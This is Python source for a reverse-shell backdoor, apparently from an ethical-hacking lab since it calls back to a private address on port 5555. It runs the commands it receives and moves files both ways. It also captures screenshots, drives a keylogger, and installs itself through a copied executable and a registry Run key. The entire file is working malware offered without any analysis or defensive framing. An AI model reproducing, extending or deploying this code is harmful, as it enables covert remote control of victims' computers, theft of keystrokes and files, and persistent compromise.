import socket
import json
import subprocess
import time
import os
# pip3 install pyautogui
import pyautogui  # This is used for taking screenshots in this program
import keylogger
import threading
# We would us shutil python lib
# To copy our exe to a new path in target machine
import shutil
import sys


def reliable_send(data):
    json_data = json.dumps(data)
    s.send(json_data.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, 'wb')  # Open file for writing in bytes
    s.settimeout(1)  # so we can get the end of file
    chunk = s.recv(1024)  # Receive first 1024 bytes of data
    while chunk:  # While we got data
        f.write(chunk)  # Reconstruct that byte data to our new file
        try:
            chunk = s.recv(1024)  # Try to get more byte, if yes (write), if no (wait for 1 sec and raise timeout exc)
        except socket.timeout as e:  # If timeout is < 1 break loop
            break
    s.settimeout(None)  # set timeout back to None   (as empty) so not to affect other socket objects
    f.close()  # successfully retrieved file - then close file


def upload_file(file_name):
    f = open(file_name, 'rb')  # Read as bytes, since we need to send Byte data
    s.send(f.read())  # Read the file in bytes and send


def screenshot():
    my_screenshot = pyautogui.screenshot()
    my_screenshot.save('screen.png')


def persist(reg_name, copy_name):
    file_location = os.environ['appdata'] + '\\' + copy_name
    try:
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
            reliable_send('[+] Created persistence with Reg_Key: ' + reg_name)
        else:
            reliable_send('[+] Persistence already exists')
    except:
        reliable_send('[+] Error creating persistence with target machine')


def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('10.0.2.15', 5555))
            shell()
            s.close()
            break
        except:
            connection()


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        if command == 'background':
            pass
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screenshot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command[:12] == 'keylog_start':
            key_log = keylogger.Keylogger()
            t = threading.Thread(target=key_log.start)
            t.start()
            reliable_send('[+] Keylogger Started!')
        elif command[:11] == 'keylog_dump':
            logs = key_log.read_logs()
            reliable_send(logs)
        elif command[:11] == 'keylog_stop':
            key_log.self_destruct()
            t.join()
            reliable_send('[+] Keylogger Stopped!')
        elif command[:11] == 'persistence':
            reg_name, copy_name = command[12:].split(' ')
            persist(reg_name, copy_name)
        elif command[:7] == 'sendall':
            subprocess.Popen(command[8:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
